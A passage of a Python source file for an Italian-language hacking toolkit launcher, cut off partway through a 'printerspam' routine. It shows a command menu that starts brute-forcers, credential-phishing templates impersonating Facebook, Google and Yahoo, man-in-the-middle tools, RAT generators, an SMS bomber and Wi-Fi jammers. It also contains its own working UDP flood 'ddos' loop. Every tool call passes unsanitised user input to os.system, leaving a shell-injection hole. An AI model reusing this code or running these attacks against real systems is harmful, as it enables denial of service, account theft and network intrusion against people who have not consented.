    elif command == 'jsql':
        print("-# Attendi l'avvio")
        os.system("open jsql")
        return menu()
    elif command == 'nosqlmap':
        os.system("gnome-terminal -- NoSQLMap")
        return menu()
    elif command == 'webscarab':
        os.system("open webscarab")
        return menu()
    elif command == 'sqldict':
        os.system("open sqldict")
        return menu()
    elif command == 'cewl':
        if option:
            print("")
            os.system("cewl --email -a --no-words %s"%(option))
            print("")
            return menu()
        else:
            print("-# Uso: $ cewl <indirizzo>")
            return menu()
    elif command == "icloudbrutter":
        if option:
            if argument:
                if os.path.exists(argument) == False:
                    print("-# %sErrore%s: File non trovato"%(red,end))
                    return menu()
                print("")
                os.system("cd Tools/iCloudBrutter/ && python3 icloud.py --id %s --wordlist %s"%(option, argument))
                print("")
                return menu()
            else:
                print("-# %sErrore%s: Wordlist richiesta"%(red,end))
                return menu()
        else:
            print("-# Uso: $ icloudbrutter <idapple> </full/path/to/wordlist>")
            return menu()

        # Scanning
    elif command == 'cpscan':
        if option:
            if "http://" in option:
                option = option.split("http://")[1]
            if "https://" in option:
                option = option.split("https://")[1]
            os.system("xterm -T 'Cpscan' -e 'cd Tools/cpscan/ && python cpscan.py -t %s -v'"%(option))
        else:
            print("-# Uso: $ cpscan <indirizzo>")
        return menu()
    elif command == 'breacher':
        if option:
            if '.' not in option:
                print("-# %sErrore%s: Inserisci un indirizzo valido"%(red,end))
                return menu()
            os.system("cd Tools/Breacher/ && python breacher.py -u %s"%(option))
            print("")
            return menu()
        else:
            print("-# Uso: $ breacher <indirizzo>")
            return menu()
    elif command == 'dotdotpwn':
        if option:
            if "http://" in option:
                option = option.split("http://")[1]
            if "https://" in option:
                option = option.split("https://")[1]
            print("")
            os.system("dotdotpwn -m http -h %s -O -s"%(option))
            print("")
            return menu()
        else:
            print("-# Uso: $ dotdotpwn <indirizzo>")
            return menu()
    elif command == 'parsero':
        if option:
            if "http://" in option:
                option = option.split("http://")[1]
            if "https://" in option:
                option = option.split("https://")[1]
            os.system("parsero -u %s -o -sb"%(option))
            return menu()
        else:
            print("-# Uso: $ parsero <indirizzo>")
            return menu()
    elif command == 'angryfuzzer':
        if option:
            if 'http://' not in option:
                if "https://" in option:
                    pass
                else:
                    option = "http://" + option
            print("")
            os.system("cd Tools/angryFuzzer/ && python angryFuzzer.py -u %s -q"%(option))
            print("")
            return menu()
        else:
            print("-# Uso: $ angryfuzzer <indirizzo>")
            return menu()
    elif command == 'dirb':
        if option:
            target = option
            print("-# Salvataggio della ricerca al termine di DIRB in %sLogs/DIRB.txt%s"%(blue,end))
            if 'http://' not in option:
                target = "http://" + option
            if 'http://' in option or 'https://' in option:
                pass
            os.system("gnome-terminal -- dirb %s -f -l -w -o Logs/DIRB.txt"%(target))
        else:
            print("-# Uso: $ dirb <indirizzo>")
        return menu()
    elif command == 'dirbuster':
        os.system("gnome-terminal -- dirbuster")
        return menu()
    elif command == 'dtect':
        os.system("gnome-terminal -- python " + os.getcwd() + "/Tools/D-TECT/d-tect.py")
        return menu()
    elif command == 'sechub':
        os.system("gnome-terminal -- python " + os.getcwd() + "/Tools/secHub/sechub.py")
        return menu()
    elif command == 'arachni':
        if option:
            target = option
            if 'http://' in option or 'https://' in option:
                pass
            elif 'http://' not in option:
                target = "http://" + option
            os.system("arachni %s"%(target))
        else:
            print("-# %sErrore%s: %sArachni%s richiede un indirizzo"%(red,end, blue,end))
        return menu()
    elif command == 'wpscan':
        if option:
            os.system("wpscan %s"%(option))
            print("")
            return menu()
        else:
            print("-# Uso: wpscan <indirizzo>")
            return menu()
    elif command == 'zaproxy':
        os.system("open zaproxy")
        return menu()
    elif command == 'zenmap':
        os.system("open zenmap")
        return menu()
    elif command == 'uniscan':
        if option:
            print("")
            os.system("uniscan -u %s -qwedsg"%(option))
            print("\n")
            return menu()
        else:
            print("-# Uso: $ uniscan <indirizzo>")
            return menu()
    elif command == 'droopescan':
        if option:
            modules = ['drupal','joomla','moodle','silverstripe','wordpress']
            if option in modules:
                if argument:
                    target = argument
                    if 'http://' not in argument:
                        if 'https://' in argument:
                            pass
                        else:
                            target = "http://" + argument
                    print("")
                    os.system("droopescan scan %s -u %s"%(option, target))
                    print("")
                else:
                    print("-# %sErrore%s: Indirizzo richiesto"%(red,end))
            else:
                print("-# %sErrore%s: Modulo non valido"%(red,end))
        else:
            print("")
            print("-# Uso: $ droopescan <modulo> <indirizzo>")
            print("")
            print("-# %sModuli%s:"%(bright_green,end))
            print(" [ drupal / joomla / moodle / silverstripe / wordpress ]")
            print("")
        return menu()
    elif command == 'bingoo':
        os.system("cd Tools/BinGoo/ && ./bingoo")
        logo_menu()
    elif command == 'knockmail':
        os.system("cd Tools/KnockMail/ && python knock.py")
        logo_menu()
    elif command == 'xsssniper':
        if option:
            os.system("cd Tools/xsssniper/ && python xsssniper.py -u %s --crawl"%(option))
            print("")
        else:
            print("-# Uso: xsssniper <indirizzo>")
        return menu()
    elif command == 'hping3':
        if option:
            if option == 'scan':
                if argument:
                    if "http://" in argument:
                        argument = argument.split("http://")[1]
                    if "https://" in argument:
                        argument = argument.split("https://")[1]
                    print("")
                    os.system("hping3 --scan 1-30,70-500 -S %s"%(argument))
                    print("")
                    return menu()
                else:
                    print("-# %sErrore%s: Indirizzo richiesto"%(red,end))
                    return menu()
            elif option == 'stress':
                print("")
                os.system("hping3 --flood %s"%(argument))
                print("")
                return menu()
            else:
                print("-# %sErrore%s: Metodo non valido"%(red,end))
                return menu()
        else:
            print("-# Uso: $ hping3 <scan/stress> <indirizzo>")
            return menu()
    elif command == 'sslyze':
        if option:
            os.system("sslyze --regular %s"%(option))
            print("")
            return menu()
        else:
            print("-# Uso: $ sslyze <indirizzo>")
            return menu()
    elif command == 'nikto':
        if option:
            print("")
            os.system("nikto -host %s"%(option))
            print("")
            return menu()
        else:
            print("-# Uso: $ nikto <indirizzo>")
            return menu()
    elif command == 'cutycapt':
        if option:
            target = option
            if 'http://' not in option:
                target = "http://" + option
            elif 'http://' in option or 'https://' in option:
                pass
            print("-# Attendi il termine del processo se eseguito correttamente.")
            os.system("gnome-terminal -- cutycapt --url==%s --out==Logs/cutycapt_screenshot.png"%(target))
        else:
            print("-# Uso: $ cutycapt <indirizzo>")
        return menu()
    elif command == 'fimap':
        if option:
            target = option
            print("")
            if 'http://' not in option:
                target = "http://" + option
            if 'http://' in option or 'https://' in option:
                pass
            os.system("fimap -u %s -4 -C -D --force-run"%(target))
            print("")
        else:
            print("-# Uso: $ fimap <indirizzo>")
        return menu()
    elif command == 'vega':
        os.system("open vega")
        return menu()
    elif command == 'infoga':
        if option:
            os.system("cd Tools/Infoga/ && python infoga.py -d %s -s all -v 3"%(option))
            return menu()
        else:
            print("-# Uso: $ infoga <indirizzo>")
            return menu()
    elif command == "wafw00f":
        if option:
            os.system("wafw00f --findall --verbose %s"%(option))
            print("")
        else:
            print("-# Uso: $ wafw00f <indirizzo>")
        return menu()
    elif command == "skipfish":
        if option:
            os.system("xterm -e 'rm -rf Logs/Skipfish'")
            if "http://" not in option:
                if "https://" in option:
                    pass
                else:
                    option = "http://"+option
            os.system("skipfish -U -o %s/Logs/Skipfish %s"%(os.getcwd(),option))
            try:
                f = open("%s/Logs/Skipfish/index.html"%(os.getcwd()))
                f.close()
                print("\n-# Apro la pagina di analisi, solo un momento...\n")
                os.system("open firefox %s/Logs/Skipfish/index.html"%(os.getcwd()))
            except IOError:
                print("-# Errore nell'apertura del file, questo non dovrebbe succedere...")
        else:
            print("-# Uso: $ skipfish <indirizzo>")
        return menu()
    elif command == "devploit":
        os.system("gnome-terminal -- Devploit")
        return menu()

    # enum
    elif command == 'sublist3r':
        if option:
            if "http://" in option:
                option = option.split("http://")[1]
            if "https://" in option:
                option = option.split("https://")[1]
            os.system("sublist3r -d %s -p 80 -v"%(option))
            print("")
        else:
            print("-# Uso: $ sublist3r <indirizzo>")
        return menu()
    elif command == 'dnsenum':
        if option:
            if "http://" in option:
                option = option.split("http://")[1]
            if "https://" in option:
                option = option.split("https://")[1]
            print("")
            os.system("dnsenum -u a -v %s"%(option))
            print("")
        else:
            print("-# Uso: $ dnsenum <indirizzo>")
        return menu()
    elif command == 'dnsmap':
        if option:
            target = option
            if "http://" in option:
                target = option.split("http://")
                target = target[1]
            if "https://" in option:
                target = option.split("https://")
                target = target[1]
            if "www." in option or "www." in target:
                target = option.split("www.")
                target = target[1]
            print("")
            os.system("dnsmap %s"%(target))
            print("")
            return menu()
        else:
            print("-# Uso: $ dnsmap <indirizzo>")
            return menu()
    elif command == 'smtpuserenum':
        if option:
            if '.txt' in option or '.lst' in option:
                if argument:
                    if os.path.exists(option) == False:
                        print("-# %sErrore%s: File non trovato"%(red,end))
                        return menu()
                    print("")
                    os.system("smtp-user-enum -M VRFY -U %s -t %s"%(option, argument))
                    print("")
                else:
                    print("-# %sErrore%s: Indirizzo richiesto"%(red,end))
                return menu()
            if argument:
                if "http://" in argument:
                    argument = argument.split("http://")[1]
                if "https://" in argument:
                    argument = argument.split("https://")[1]
                os.system("smtp-user-enum -M VRFY -u %s -t %s"%(option, argument))
                print("")
            else:
                print("-# %sErrore%s: Indirizzo richiesto"%(red,end))
        else:
            print("-# Uso: $ smtpuserenum <user/user_list.txt> <indirizzo>")
        return menu()
    elif command == 'sshscan':
        if option:
            if "http://" in option:
                option = option.split("http://")[1]
            if "https://" in option:
                option = option.split("https://")[1]
            os.system("python Tools/SSHScan/sshscan.py -t %s"%(option))
            print("")
        else:
            print("-# Uso: $ sshscan <indirizzo>")
        return menu()
    elif command == 'pentmenu':
        os.system("./Tools/pentmenu/pentmenu")
        logo_menu()
    elif command == 'a2sv':
        if option:
            port = 80
            if 'https://' in option:
                port = 443
            print("")
            os.system("cd Tools/a2sv/ && python a2sv.py -t %s -p %s"%(option, port))
            print("")
        else:
            print("-# Uso: a2sv <indirizzo>")
        return menu()
    elif command == 'recon-ng':
        os.system("gnome-terminal -- recon-ng")
        return menu()
    elif command == 'sslscan':
        if option:
            port = 80
            if 'https://' in option:
                port = 443
            print("")
            os.system("sslscan %s:%s"%(option, port))
            print("")
        else:
            print("-# Uso: $ sslscan <indirizzo>")
        return menu()
    elif command == 'xsstracer':
        if option:
            port = 80
            if 'https://' in option:
                port = 443
            os.system("cd Tools/XSSTracer/ && python xsstracer.py %s %s"%(option, port))
        else:
            print("-# Uso: $ xsstracer <indirizzo>")
        return menu()
    elif command == 'crips':
        os.system("gnome-terminal -- crips")
        return menu()
    elif command == 'vbscan':
        if option:
            target = option
            if 'http://' not in option:
                target = "http://" + option
            elif 'http://' in option or 'https://' in option:
                pass
            os.system("cd Tools/vbscan/ && perl vbscan.pl %s"%(target))
            print("")
        else:
            print("-# Uso: $ vbscan <indirizzo>")
        return menu()
    elif command == 'whatweb':
        if option:
            os.system("whatweb -v -a 3 %s"%(option))
        else:
            print("-# Uso: $ whatweb <indirizzo>")
        return menu()
    elif command == 'siege':
        if option:
            print("")
            os.system("siege -g %s"%(option))
        else:
            print("-# Uso: $ siege <indirizzo>")
        return menu()
    elif command == 'urlextractor':
        if option:
            os.system("cd Tools/URLextractor/ && ./extractor.sh %s"%(option))
            print("")
        else:
            print("-# Uso: $ urlextractor <indirizzo>")
        return menu()
    elif command == 'instarecon':
        if option:
            target = option
            if "http://" in option:
                target = option.split("http://")
                target = target[1]
            if "https://" in option:
                target = option.split("https://")
                target = target[1]
            if "www." in option or "www." in target:
                target = option.split("www.")
                target = target[1]
            os.system("instarecon.py %s"%(target))
            print("")
        else:
            print("-# Uso: $ instarecon <indirizzo>")
        return menu()
    elif command == 'dsxs':
        if option:
            print("")
            os.system("cd Tools/DSXS/ && python dsxs.py -u %s"%(option))
            print("")
        else:
            print("-# Uso: $ dsxs <indirizzo>")
        return menu()
    elif command == 'joomscan':
        if option:
            if argument:
                if argument2:
                    if argument3:
                        if argument4:
                            os.system("joomscan -u %s -sp %s %s %s %s"%(option, argument, argument2, argument3, argument4))
                            print("")
                            return menu()
                        os.system("joomscan -u %s -sp %s %s %s"%(option, argument, argument2, argument3))
                        print("")
                        return menu()
                    os.system("joomscan -u %s -sp %s %s"%(option, argument, argument2))
                    print("")
                    return menu()
                elif argument == '-nf' or argument == '-vu' or argument == '-nvf' or argument == '-nv':
                    os.system("joomscan -u %s -sp %s"%(option, argument))
                    print("")
                    return menu()
                else:
                    print("-# %sErrore%s: %sJoomscan%s richiede un opzione valida"%(red,end, blue,end))
                    return menu()
            os.system("joomscan -u %s -sp"%(option))
            print("")
            return menu()
        else:
            print("")
            print("-# Uso: $ joomscan <target> [options]")
            print("")
            print(" -nf  : No Firewall   - Nessun rilevamento del Firewall")
            print(" -nv  : No Version    - Nessun Rilevamento della versione")
            print(" -nvf : No V. & No F. - Nessun Rilevamento Firewall e Versione")
            print(" -vu  : Verbosity     - Mostra un output piÃ¹ verboso")
            print("")
            return menu()
    elif command == 'amap':
        if option:
            if "http://" in option:
                option = option.split("http://")[1]
            if "https://" in option:
                option = option.split("https://")[1]
            port = 80
            if "https://" in option:
                port = 443
            print("")
            os.system("amap %s %s -A -bvq -1"%(option, port))
            print("")
            return menu()
        else:
            print("-# Uso: $ amap <indirizzo>")
            return menu()
    elif command == 'automater':
        if option:
            print("-# Solo un momento...")
            os.system("automater %s -v"%(option))
            print("")
            return menu()
        else:
            print("-# Uso: $ automater <indirizzo>")
            return menu()
    elif command == 'ip2host':
        if option:
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for w in option:
                if w in checkwords:
                    if "http://" in option:
                        option = option.split("http://")[1]
                    if "https://" in option:
                        option = option.split("https://")[1]
                    break
            try:
                getip = socket.gethostbyname("%s"%(option))
            except socket.gaierror:
                print("-# %sErrore%s: Indirizzo sconosciuto"%(red,end))
                return menu()
            option = getip
            try:
                socket.inet_aton(option)
            except (socket.error, UnboundLocalError):
                print("-# %sErrore%s: Indirizzo IP non valido"%(red,end))
                return menu()
            hostname = socket.getfqdn(option)
            if hostname == option:
                print("-# Nessun Hostname assegnato per: %s"%(blue+hostname+end))
                return menu()
            print '-# Hostname: ' + blue + hostname + end
            return menu()
        else:
            print("-# Uso: $ ip2host <indirizzo IP>")
            return menu()
    elif command == "owscan":
        os.system("cd Tools/OWScan/ && php owscan.php")
        print("")
        return menu()
    elif command == "xsstrike":
        os.system("cd Tools/XSStrike/ && ./xsstrike")
        print("")
        return menu()
    elif command == 'xhydra':
        os.system("open xhydra")
        os.system("xterm -e 'rm hydra.restore'")
        return menu()
    elif command == 'xattacker':
        os.system("reset")
        os.system("cd Tools/XAttacker/ && perl XAttacker.pl")
        logo_menu()
    elif command == 'blazy':
        os.system("cd Tools/Blazy && python blazy.py")
        return menu()
    elif command == 'fbht':
        os.system("cd Tools/fbht/ && python main.py") ; sleep(.1)
        logo_menu()
    elif command == 'brutesploit':
        os.system("cd Tools/BruteSploit/ && ./Brutesploit")
        logo_menu()
    elif command == 'instaburst':
        os.system("cd Tools/InstaBurst/ && python instagram.py")
        logo_menu()
    elif command == "blackhydra":
        os.system("cd Tools/Black-Hydra/ && python blackhydra.py")
        logo_menu()
    elif command == "ddos":
        if option:
            target = option
            if argument:
                mode = argument
                mode_list = ["slow","normal","fast","ultra"]
                if mode not in mode_list:
                    print("-# %sErrore%s: ModalitÃ  d'attacco non valida"%(red,end))
                    return menu()
                if mode == "slow":
                    speed = .07
                if mode == "normal":
                    speed = .01
                if mode == "fast":
                    speed = .001
                if mode == "ultra":
                    speed = 0
                # check port
                port = 80
                if "https://" in target:
                    port = 443
                # attack
                client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # 1024 represents 1 kilobyte to the server
                byte = random._urandom(1024)
                inviati = 0
                # check if address exist
                try:
                    client.sendto(byte, (target, port))
                except socket.gaierror:
                    print("-# %sErrore%s: Indirizzo sconosciuto"%(red,end))
                    return menu()
                #
                print("[%s*%s] Ctrl + C per fermare"%(bright_yellow,end))
                while 1:
                    try:
                        try:
                            client.sendto(byte, (target, port))
                        except socket.gaierror:
                            print("-# %sErrore%s: Indirizzo sconosciuto"%(red,end))
                            return menu()
                        sys.stdout.write("\r" + "[%s*%s] Pacchetti inviati: %s "%(bright_yellow,end,inviati))
                        sys.stdout.flush()
                        inviati += 1
                        time.sleep(speed)
                    except (KeyboardInterrupt,EOFError):
                        print("\n-# Interrotto")
                        return menu()
            else:
                print("-# %sErrore%s: ModalitÃ  d'attacco richiesta"%(red,end))
        else:
            print("-# Uso: $ ddos <target> <slow/normal/fast/ultra>")
        return menu()
    elif command == "drup":
        if option:
            os.system("cd Tools/Drup/ && python drup.py %s"%(option))
            print("")
        else:
            print("-# Uso: $ drup <acer/cisco/d-link/asus/...>")
        return menu()
    elif command == "cr3dov3r":
        if option:
            os.system("cd Tools/Cr3dOv3r/ && python3 Cr3d0v3r.py -api2 %s"%(option))
            print("")
        else:
            print("-# Uso: $ cr3dov3r <email/username to check>")
        return menu()

    # WiFi
    elif command == 'airgeddon':
        os.system("reset")
        os.system("cd Tools/airgeddon/ && ./airgeddon.sh")
        logo_menu()
    elif command == 'fluxion':
        os.system("reset")
        os.system("cd Tools/fluxion/ && ./fluxion.sh")
        logo_menu()
    elif command == 'fakeauth':
        os.system("gnome-terminal -- python " + os.getcwd() + "/Tools/FakeAuth/FakeAuth/fakeauth.py")
        return menu()
    elif command == 'wifiphisher':
        if option:
            essid = option
            if argument:
                templates = ["facebook","google","gopro","starbucks","yahoo"]
                template = argument
                if template not in templates:
                    print("-# %sErrore%s: Template non valido"%(red,end))
                    return menu()
                if template == "facebook":
                    template = "facebook-login"
                if template == "google":
                    template = "google-login"
                if template == "gopro":
                    template = "gopro-login"
                if template == "starbucks":
                    template = "starbucks-login"
                if template == "yahoo":
                    template = "yahoo-login"
                os.system("wifiphisher -nJ -e %s -T %s"%(essid,template))
            else:
                print("-# %sErrore%s: Template richiesto"%(red,end))
        else:
            print("")
            print("-# Uso: $ wifiphisher <fake-AP name> <template>")
            print("")
            print("-# %sTemplates%s:"%(bright_green,end))
            print(" [ facebook / google / gopro / starbucks / yahoo ]")
            print("")
        return menu()
    elif command == 'wifite':
        os.system("gnome-terminal -- wifite")
        return menu()
    elif command == 'wpsbreaker':
        os.system("cd Tools/HT-WPS-Breaker/ && ./HT-WB.sh")
        logo_menu()
    elif command == 'netattack':
        os.system("reset")
        os.system("cd Tools/netattack2/ && python netattack2.py")
        logo_menu()
    elif command == 'wifijammer':
        os.system("gnome-terminal -- python Tools/wifijammer/wifijammer.py")
        return menu()
        # Exploiting
    elif command == 'routersploit':
        os.system("reset")
        os.system("cd Tools/routersploit/ && python rsf.py")
        os.system("xterm -T 'Logs' -e 'rm routersploit.log'")
        logo_menu()
    elif command == 'wirespy':
        os.system("reset")
        os.system("cd Tools/wirespy/ && ./wirespy.sh")
        logo_menu()

    # MitM
    elif command == 'bettercap':
        os.system("gnome-terminal -- bettercap -X -L -S ARP --proxy --proxy-https --httpd -O Logs/bettercap-saves.txt")
        print("-# Logs alla chiusura di Bettercap in %sLogs/bettercap-saves.txt%s"%(blue,end))
        return menu()
    elif command == 'morpheus':
        os.system("reset")
        os.system("cd Tools/morpheus/ && ./morpheus.sh")
        logo_menu()
    elif command == 'wireshark':
        os.system("open wireshark")
        return menu()
    elif command == 'ettercap':
        os.system("gnome-terminal -- ettercap -G")
        return menu()
    elif command == 'mitmf':
        os.system("gnome-terminal -- mitmf -i %s --spoof --arp --dns --hsts --gateway %s"%(netifaces.gateways()['default'][netifaces.AF_INET][1], str(get_gateway())))
        return menu()
    elif command == 'mitmap':
        os.system("cd Tools/mitmAP/ && python3 mitmAP.py")
        print("\n-# %sAttenzione%s: Attendi per la riconnessione alla rete.\n"%(bright_yellow,end))
        try:
            time.sleep(3)
        except (KeyboardInterrupt,EOFError):
            pass
        logo_menu()
    elif command == 'cdpsnarf':
        print("-# Il pacchetto CDP Ã¨ generalmente usato da sistemi cisco per comunicare tra loro e coi")
        print("   dispositivi connessi. Esso puÃ² contenere informazioni sensibili sui dispositivi.")
        print("-# %sAttenzione%s: L'output di %sCDPSnarf%s verrÃ  salvato nella cartella %sLogs%s."%(bright_yellow,end, blue,end, blue,end))
        print("")
        time.sleep(3)
        os.system("cdpsnarf -i %s -w Logs/CDPSnarf.pcap"%(netifaces.gateways()['default'][netifaces.AF_INET][1]))
        print("")
        return menu()
    elif command == 'cookie-cadger':
        os.system("open cookie-cadger")
        return menu()
    elif command == 'ciscotorch':
        if option:
            modules = ["all","ssh","snmp","telnet","ntp","tfpt","ssl","webserver","ios_http"]
            module = None
            if option == 'all':
                module = "-A"
            elif option == 'ssh':
                module = "-s"
            elif option == 'snmp':
                module = "-u"
            elif option == 'telnet':
                module = "-t"
            elif option == 'ntp':
                module = "-n"
            elif option == 'tftp':
                module = "-j"
            elif option == 'ssl':
                module = "-c"
            elif option == 'webserver':
                module = "-w"
            elif option == 'ios_http':
                module = "-z"
            elif option not in modules:
                print("-# %sErrore%s: Modulo non valido"%(red,end))
                return menu()
            if argument == None:
                print("-# %sErrore%s: Indirizzo richiesto"%(red,end))
                return menu()
            if "http://" in argument:
                argument = argument.split("http://")[1]
            if "https://" in argument:
                argument = argument.split("https://")[1]
            os.system("cisco-torch %s %s"%(module, argument))
            print("")
        else:
            print("")
            print("-# Uso: $ ciscotorch <modulo> <indirizzo>")
            print("")
            print("-# %sModuli%s:"%(bright_green,end))
            print(" [ all / ssh / snmp / telnet / ntp / tfpt / ssl / webserver / ios_http ]")
            print("")
        return menu()
    elif command == 'p0f':
        os.system("gnome-terminal -- p0f -p")
        return menu()
    elif command == 'snmpcheck':
        if option:
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for w in option:
                if w in checkwords:
                    if "http://" in option:
                        option = option.split("http://")[1]
                    if "https://" in option:
                        option = option.split("https://")[1]
                    break
            try:
                getip = socket.gethostbyname("%s"%(option))
            except socket.gaierror:
                print("-# %sErrore%s: Indirizzo sconosciuto"%(red,end))
                return menu()
            option = getip
            os.system("snmp-check %s"%(option))
            print("")
            return menu()
        else:
            print("-# Snmp-Check funziona solo se il bersaglio ha la porta 161 aperta")
            print("-# Uso: $ snmpcheck <indirizzo IP>")
            return menu()
    elif command == 'sslstrip':
        print("-# Logs al termine in %sLogs/sslstrip.txt%s"%(blue,end))
        print("")
        os.system("sslstrip --all -w Logs/sslstrip.txt -l 8080")
        print("")
        return menu()
    elif command == 'bluelog':
        os.system("bluelog -n -m -c -f -t -e -i hci0 -o Logs/bluelog.log -v")
        return menu()
    elif command == 'dhcpig':
        print("")
        os.system("cd Tools/DHCPig/ && python pig.py -a -i -l -g -r -n -c %s"%(netifaces.gateways()['default'][netifaces.AF_INET][1]))
        print("")
        return menu()
    elif command == "voiphopper":
        if option:
            os.system("voiphopper -i %s -c 0"%(option))
            print("")
            return menu()
        else:
            print("-# Uso: $ voiphopper <interface>")
            return menu()
    elif command == "driftnet":
        print("")
        os.system("driftnet -s -v")
        print("")
        return menu()

    # Exploiting
        # Payload Generator
    elif command == 'chaos':
        os.system("reset")
        os.system("cd Tools/CHAOS/ && go run CHAOS.go")
        logo_menu()
    elif command == 'overthruster':
        os.system("gnome-terminal -- python " + os.getcwd() + "/Tools/OverThruster/OverThruster.py")
        return menu()
    elif command == 'arcanus':
        os.system("reset")
        os.system("cd Tools/ARCANUS/ && ./ARCANUS")
        logo_menu()
    elif command == 'evildroid':
        os.system("reset")
        os.system("cd Tools/Evil-Droid/ && ./evil-droid")
        logo_menu()
    elif command == 'ezsploit':
        os.system("reset")
        os.system("cd Tools/ezsploit/ && ./ezsploit.sh")
        logo_menu()
    elif command == 'zirikatu':
        os.system("reset")
        os.system("cd Tools/zirikatu/ && ./zirikatu.sh")
        os.system("rm source/ output/ handler/ -r")
        logo_menu()
    elif command == 'kautilya':
        os.system("cd Tools/Kautilya/ && ruby kautilya.rb")
        logo_menu()
    elif command == 'debinject':
        os.system("cd Tools/Debinject/ && python debinject.py")
        logo_menu()
        # Exploiting
    elif command == 'armitage':
        os.system("open armitage")
        return menu()
    elif command == 'setoolkit' or command == 'set' or command == 's.e.t':
        os.system("gnome-terminal -- setoolkit")
        return menu()
    elif command == 'fatrat' or command == 'thefatrat':
        os.system("gnome-terminal -- fatrat")
        return menu()
    elif command == 'eggshell':
        os.system("reset")
        os.system("cd Tools/EggShell/ && python eggshell.py")
        logo_menu()
    elif command == 'shellsploit':
        os.system("gnome-terminal -- shellsploit")
        return menu()
    elif command == 'beelogger':
        os.system("cd Tools/BeeLogger/ && python bee.py")
        logo_menu()
    elif command == 'saint':
        os.system("cd Tools/sAINT/ && java -jar sAINT.jar")
        logo_menu()
    elif command == 'brutal':
        os.system("./Tools/Brutal/Brutal.sh")
        logo_menu()
    elif command == 'astroid':
        os.system("cd Tools/astroid/ && ./astroid.sh")
        logo_menu()
    elif command == 'jexboss':
        if option:
            os.system("cd Tools/jexboss/ && python jexboss.py -u %s"%(option))
        else:
            print("-# Uso: $ jexboss <indirizzo [IP]>")
        return menu()
    elif command == 'weeman':
        os.system("reset")
        os.system("cd Tools/weeman/ && python weeman.py")
        logo_menu()
    elif command == 'u3pwn':
        os.system("gnome-terminal -- u3-pwn")
        return menu()
    elif command == 'koadic':
        os.system("cd Tools/koadic/ && ./koadic")
        logo_menu()
    elif command == 'pentestly':
        os.system("cd Tools/pentestly/ && ./pentestly")
        logo_menu()
    elif command == 'l0l':
        os.system("cd Tools/l0l/ && ./l0l")
        logo_menu()
    elif command == 'termineter':
        os.system("gnome-terminal -- termineter")
        return menu()
    elif command == 'kayak':
        os.system("gnome-terminal -- kayak")
        return menu()
    elif command == 'pybomber':
        print("")
        os.system("cd Tools/pybomber/ && python smsbomber.py")
        logo_menu()
    elif command == 'ciscoge':
        if option:
            if argument:
                os.system("cd Tools/cisco-global-exploiter/ && perl cge.pl %s %s"%(option,argument))
                return menu()
            else:
                os.system("cd Tools/cisco-global-exploiter/ && perl cge.pl")
                print("\n-# %sErrore%s: Metodo d'attacco richiesto (1-14)"%(red,end))
                return menu()
        else:
            os.system("cd Tools/cisco-global-exploiter/ && perl cge.pl")
            print("\n-# Uso: $ ciscoge <indirizzo IP locale> <metodo (1-14)>")
            return menu()
    elif command == 'yersinia':
        print("-# Premi %sq%s per chiudere la finestra di yersinia"%(blue,end))
        os.system("gnome-terminal --geometry=80x25 -- yersinia -I")
        os.system("xterm -e 'rm yersinia.log'")
        return menu()
    elif command == 'wole':
        if option:
            if option == 'sniff':
                command = "gnome-terminal -- wol-e -s -i %s"%(netifaces.gateways()['default'][netifaces.AF_INET][1])
            elif option == 'wakeup':
                command = "wol-e -fa"
            elif option == 'detect_apple_mac':
                command = "wol-e -f"
            else:
                print("-# %sErrore%s: Modulo non valido"%(red,end))
                return menu()
            os.system(command)
        else:
            print("-# Uso: $ wole <sniff/detect_apple_mac/wakeup>")
        return menu()
    elif command == 'responder':
        os.system("responder -wrfdbv -P -I %s"%(netifaces.gateways()['default'][netifaces.AF_INET][1]))
        print("")
        return menu()
    elif command == 'xspy':
        os.system("gnome-terminal -- xspy")
        return menu()
    elif command == "eflood":
        os.system("cd Tools/Eflood/ && python eflood.py")
        return menu()
    elif command == "microsploit":
        os.system("cd Tools/Microsploit/ && ./Microsploit")
        logo_menu()
    elif command == "darksploit":
        os.system("cd Tools/DarkSploit/ && python DrXp.py")
        logo_menu()
    elif command == "onelin3r":
        os.system("cd Tools/One-Lin3r/ && python One_Lin3r.py")
        logo_menu()

    # MultiTool
    elif command == 'hakkuf' or command == 'hakku':
        os.system("reset")
        os.system("cd Tools/hakkuframework/ && ./hakku")
        logo_menu()
    elif command == 'penbox':
        os.system("gnome-terminal -- python " + os.getcwd() + "/Tools/PenBox/penbox.py")
        return menu()
    elif command == 'simple-ducky':
        os.system("gnome-terminal -- simple-ducky")
        return menu()
    elif command == 'discover':
        os.system("cd Tools/discover/ && ./discover.sh")
        logo_menu()
    elif command == 'zarp':
        os.system("cd Tools/zarp/ && python zarp.py")
        logo_menu()
    elif command == 'sb0x':
        os.system("cd Tools/sb0x-project/ && python sb0x.py")
        logo_menu()
    elif command == 'atscan':
        os.system("cd Tools/ATSCAN/ && perl atscan.pl --interactive")
        logo_menu()
    elif command == 'inguma':
        print("")
        os.chdir("Tools/inguma/")
        os.system("python inguma.py")
        os.chdir("../../")
        logo_menu()
    elif command == 'websploit':
        os.system("reset")
        os.system("cd Tools/websploit/ && ./websploit")
        logo_menu()
    elif command == "trity":
        os.system("gnome-terminal -- trity")
        return menu()
    elif command == "socialfish":
        os.system("cd Tools/SocialFish/ && python SocialFish.py")
        print("")
        return menu()

    # Others
    elif command == 'printerspam':
        if option: # target
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for words in option:
                if words in checkwords:
                    print("-# %sErrore%s: Indirizzo IP non valido"%(red,end))
                    return menu()
            if len(option) < 7 or "." not in option:
                print("-# %sErrore%s: Indirizzo IP non valido"%(red,end))
                return menu()
            if argument: # message
                mode = 1
                if argument2:
                    if argument2 == "slow":
                        mode = 3
                    elif argument2 == "fast":
                        mode = .4
                    elif argument2 == "normal":
                        pass
                    elif argument2 == "ultra":
                        mode = .01
                    else:
                        print("-# %sErrore%s: Spamming Mode non valida"%(red,end))
                        return menu()
